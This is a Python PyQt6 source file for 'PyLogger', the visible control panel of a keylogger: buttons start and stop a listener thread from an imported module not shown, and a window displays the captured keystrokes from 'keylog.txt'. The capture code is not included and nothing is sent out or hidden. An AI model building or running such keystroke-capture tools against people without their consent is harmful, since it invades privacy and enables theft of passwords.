import sys
import listener as ls
from PyQt6.QtWidgets import *
import threading
import globals

sys.argv += ['-platform', 'windows:darkmode=2']

global thread_running
thread_running = False

    
def threadFunct():
     ls.start_listener()

class DisplayWindow(QWidget):
    def __init__(self):
        super().__init__()

        layout = QVBoxLayout()
        self.label = QLabel("log file:")
        layout.addWidget(self.label)
        self.setWindowTitle("display log")
        self.text_edit = None

        if self.text_edit is None:
            self.text_edit = QTextEdit()
            text_file = open("keylog.txt")
            text = text_file.read()
            self.text_edit.setPlainText(text)
            layout.addWidget(self.text_edit)
        else:
            self.text_edit()  # Close window.
            self.text_edit = None
     

        self.setLayout(layout)

class HelpWindow(QWidget):
    def __init__(self):
        super().__init__()

        layout = QVBoxLayout()
        self.label = QLabel("Help File:")
        layout.addWidget(self.label)
        self.setWindowTitle("Help")
        self.text_edit = None

        if self.text_edit is None:
            self.text_edit = QTextEdit()
            text_file = open("help.txt")
            text = text_file.read()
            self.text_edit.setPlainText(text)
            layout.addWidget(self.text_edit)
        else:
            self.text_edit()  # Close window.
            self.text_edit = None
     

        self.setLayout(layout)




class PyQtLayout(QWidget):

    def __init__(self):
        super().__init__()
        self.disp_status = None
        self.disp_status_help = None
        #self.worker = Worker()
        #self.t = QThread()
        #self.worker.moveToThread(self.t)
        self.UI()
        #self.t.start()
        self.listener_thread = threading.Thread(target=threadFunct, args=())
        

    def UI(self):
        Button1 = QPushButton('start')
        Button1.clicked.connect(self.start_op)
        Button2 = QPushButton('stop')
        Button2.clicked.connect(self.end_op)
        Button3 = QPushButton('display log')
        Button3.clicked.connect(self.show_new_window)
        Button4 = QPushButton('help')
        Button4.clicked.connect(self.show_new_help_window)

        vbox = QVBoxLayout()
        vbox.addWidget(Button1)
        vbox.addWidget(Button2)
        vbox.addWidget(Button3)
        vbox.addWidget(Button4)
 
        self.setLayout(vbox)
        self.setGeometry(500, 500, 500, 500)
        self.setWindowTitle('PyLogger')
        self.show()

    def show_new_window(self, checked):
        if self.disp_status is None:
            self.disp_status= DisplayWindow()
            self.disp_status.show()

        else:
            self.disp_status.close()  # Close window.
            self.disp_status = None 
    
    def show_new_help_window(self, checked):
        if self.disp_status_help is None:
            self.disp_status_help = HelpWindow()
            self.disp_status_help.show()

        else:
            self.disp_status_help.close()  # Close window.
            self.disp_status_help = None 

    #Function for start button that starts thread for keylogger if not already started or turns the thread back on via the global variable
    def start_op(self):
        global thread_running
        #global end thread variable
        globals.end_thread = False
        #if the thread has not been started start it
        if thread_running == False:
            thread_running = True
            self.listener_thread.start()
    
    #function for stop button that changes global running variable
    def end_op(self):
        globals.end_thread = True

#Function to start the main gui loop
def start_gui():
    #creates an app frame
    app = QApplication(sys.argv)
    #starts the window with the layout I made
    window = PyQtLayout() 
    #runs the app
    sys.exit(app.exec())

start_gui()